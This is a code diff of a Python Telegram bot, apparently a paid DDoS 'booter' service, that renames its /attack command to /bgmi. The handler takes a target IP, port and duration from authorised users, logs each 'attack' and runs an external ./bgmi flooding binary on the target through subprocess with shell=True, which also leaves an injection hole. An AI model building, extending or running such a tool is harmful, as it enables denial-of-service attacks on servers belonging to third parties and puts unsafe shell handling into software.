@@ -216,7 +216,7 @@ bgmi_cooldown = {}
 COOLDOWN_TIME =0
 
 # Handler for /bgmi command
-@bot.message_handler(commands=['attack'])
+@bot.message_handler(commands=['bgmi'])
 def handle_bgmi(message):
     user_id = str(message.chat.id)
     if user_id in allowed_user_ids:
@@ -224,7 +224,7 @@ def handle_bgmi(message):
         if user_id not in admin_id:
             # Check if the user has run the command before and is still within the cooldown period
             if user_id in bgmi_cooldown and (datetime.datetime.now() - bgmi_cooldown[user_id]).seconds < 0:
-                response = "𝙥𝙡𝙚𝙖𝙨𝙚 𝙬𝙖𝙞𝙩 𝙘𝙤𝙤𝙡𝙙𝙤𝙬𝙣 𝙣𝙤𝙬 𝙩𝙝𝙖𝙣 𝙪𝙨𝙚 𝙖𝙜𝙖𝙞𝙣 /attack 𝙘𝙤𝙢𝙢𝙖𝙣𝙙."
+                response = "𝙥𝙡𝙚𝙖𝙨𝙚 𝙬𝙖𝙞𝙩 𝙘𝙤𝙤𝙡𝙙𝙤𝙬𝙣 𝙣𝙤𝙬 𝙩𝙝𝙖𝙣 𝙪𝙨𝙚 𝙖𝙜𝙖𝙞𝙣 /bgmi 𝙘𝙤𝙢𝙢𝙖𝙣𝙙."
                 bot.reply_to(message, response)
                 return
             # Update the last time the user ran the command
@@ -238,14 +238,14 @@ def handle_bgmi(message):
             if time > 150:
                 response = "𝙚𝙧𝙧𝙤𝙧: 𝙤𝙣𝙡𝙮 𝙪𝙨𝙚 𝙤𝙣 149 𝙨𝙚𝙘𝙤𝙣𝙙𝙨"
             else:
-                record_command_logs(user_id, '/attack', target, port, time)
+                record_command_logs(user_id, '/bgmi', target, port, time)
                 log_command(user_id, target, port, time)
                 start_attack_reply(message, target, port, time)  # Call start_attack_reply function
                 full_command = f"./bgmi {target} {port} {time} 600"
                 subprocess.run(full_command, shell=True)
                 response = f"𝘼𝙩𝙩𝙖𝙘𝙠 𝙛𝙞𝙣𝙞𝙨𝙝𝙚𝙙. 𝙩𝙖𝙧𝙜𝙚𝙩: {target} 𝙥𝙤𝙧𝙩: {port} 𝙙𝙪𝙧𝙖𝙩𝙤𝙞𝙣: {time}"
         else:
-            response = "𝙚𝙭𝙖𝙢𝙥𝙡𝙚 :- /attack  ☾︎𝙞𝙥☽︎ ☾︎𝙥𝙤𝙧𝙩☽ ︎☾︎𝙙𝙪𝙧𝙖𝙩𝙤𝙞𝙣☽︎"  # Updated command syntax
+            response = "𝙚𝙭𝙖𝙢𝙥𝙡𝙚 :- /bgmi  ☾︎𝙞𝙥☽︎ ☾︎𝙥𝙤𝙧𝙩☽ ︎☾︎𝙙𝙪𝙧𝙖𝙩𝙤𝙞𝙣☽︎"  # Updated command syntax
     else:
         response = "❌ 𝙮𝙤𝙪 𝙖𝙧𝙚 𝙣𝙤𝙩 𝙖𝙪𝙩𝙝𝙤𝙧𝙞𝙯𝙚𝙙 𝙩𝙤 𝙪𝙨𝙚 𝙩𝙝𝙞𝙨 𝙘𝙤𝙢𝙢𝙖𝙣𝙙."
 
@@ -277,7 +277,7 @@ def show_command_logs(message):
 @bot.message_handler(commands=['help'])
 def show_help(message):
     help_text ='''𝙘𝙤𝙢𝙢𝙖𝙣𝙙𝙨:
-🔰 /attack : 𝙪𝙨𝙚 𝙛𝙤𝙧 𝙖𝙩𝙩𝙖𝙘𝙠. 
+🔰 /bgmi : 𝙪𝙨𝙚 𝙛𝙤𝙧 𝙖𝙩𝙩𝙖𝙘𝙠. 
 🔰 /rules : 𝙘𝙝𝙚𝙘𝙠 𝙖𝙩𝙩𝙖𝙘𝙠 𝙧𝙪𝙡𝙨.
 🔰 /mylogs : 𝙘𝙝𝙚𝙘𝙠 𝙮𝙤𝙪𝙧 𝙥𝙖𝙨𝙩 𝙖𝙩𝙩𝙖𝙘𝙠𝙨.
 🔰 /plan : 𝙥𝙡𝙖𝙣 𝙟𝙖𝙧𝙪𝙧 𝙘𝙝𝙚𝙘𝙠 𝙠𝙖𝙧𝙤.
